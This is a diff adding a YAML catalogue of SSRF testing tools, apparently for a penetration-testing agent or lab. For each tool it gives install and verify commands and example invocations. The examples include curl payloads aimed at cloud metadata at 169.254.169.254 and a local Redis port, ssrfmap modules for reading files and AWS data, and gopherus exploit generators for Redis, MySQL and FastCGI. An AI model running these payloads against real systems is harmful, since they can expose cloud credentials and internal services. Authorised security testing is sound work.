@@ -1,0 +1,65 @@
+curl:
+  description: "Command-line HTTP client for crafting SSRF payloads"
+  category: "exploitation"
+  install_cmd: "apt-get install -y curl"
+  verify_cmd: "curl --version"
+  examples:
+    - "curl -s 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/'"
+    - "curl -s 'http://target/fetch?url=http://127.0.0.1:6379/'"
+    - "curl -s -X POST http://target/api/webhook -d '{\"url\":\"http://169.254.169.254/\"}'"
+
+ssrfmap:
+  description: "Automatic SSRF fuzzer and exploitation tool"
+  category: "exploitation"
+  install_cmd: "pip3 install ssrfmap"
+  verify_cmd: "ssrfmap --help | head -n 1"
+  examples:
+    - "ssrfmap -r request.txt -p url -m readfiles"
+    - "ssrfmap -r request.txt -p url -m portscan"
+    - "ssrfmap -r request.txt -p url -m aws"
+
+gopherus:
+  description: "Generate gopher:// payloads for SSRF exploitation"
+  category: "exploitation"
+  install_cmd: "pip3 install gopherus"
+  verify_cmd: "gopherus --help | head -n 1"
+  examples:
+    - "gopherus --exploit mysql"
+    - "gopherus --exploit redis"
+    - "gopherus --exploit smtp"
+    - "gopherus --exploit fastcgi"
+    - "gopherus --exploit zabbix"
+
+ffuf:
+  description: "Fast web fuzzer for discovering SSRF-vulnerable parameters"
+  category: "discovery"
+  install_cmd: "apt-get install -y ffuf"
+  verify_cmd: "ffuf -V"
+  examples:
+    - "ffuf -u 'http://target/fetch?url=FUZZ' -w ssrf-urls.txt -mc 200 -fs 0"
+    - "ffuf -u 'http://target/FUZZ' -w params.txt -mc 200"
+
+collaborator:
+  description: "Out-of-band interaction detection (Burp Collaborator / interactsh)"
+  category: "exploitation"
+  install_cmd: "go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
+  verify_cmd: "interactsh-client -version"
+  examples:
+    - "interactsh-client -v"
+
+nuclei:
+  description: "Template-based vulnerability scanner with SSRF templates"
+  category: "vuln_scanning"
+  install_cmd: "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+  verify_cmd: "nuclei -version"
+  examples:
+    - "nuclei -u http://target -t ssrf/ -silent"
+    - "nuclei -u http://target -tags ssrf -silent"
+
+python3:
+  description: "Python scripts for DNS rebinding, redirect servers, and payload generation"
+  category: "exploitation"
+  install_cmd: "apt-get install -y python3"
+  verify_cmd: "python3 --version"
+  examples:
+    - "python3 -c \"import http.server; print('Redirect server for SSRF chains')\""
